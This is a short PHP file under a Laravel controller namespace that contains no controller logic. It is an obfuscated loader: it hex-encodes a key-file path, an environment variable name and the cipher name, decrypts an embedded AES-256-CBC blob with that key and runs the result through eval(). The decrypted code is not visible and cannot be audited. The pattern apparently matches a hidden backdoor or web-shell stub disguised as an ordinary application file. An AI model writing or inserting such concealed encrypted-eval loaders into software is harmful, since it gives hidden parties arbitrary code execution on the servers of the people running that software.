<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('dOpgunGFqlECYja3DK5Dfg==');

$c=base64_decode(

'cPuElh+qsnv6gQOtiAFvrM9LTjQ2PDFba4q+pe93FXHq9q3lNa4aht/w8xohONNwAKicub3W/vmZ' .
'pV9ZB5dXyz/wmPfT74ZcFizzd2qmbqls/E9IeDqj9dZugGrPp8xgdVr91KRDUDMu/DARRnTJKSnm' .
'Mdr9FgxCEJipXVmsFLAx1IU6b/puHr9MLGUBDvxLIKvTDGkggOaia8l5/j2rYI51q3nTlQ4CEzy1' .
'aIUm+0Gk+rnG5bH9sm96bdinnWAo'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

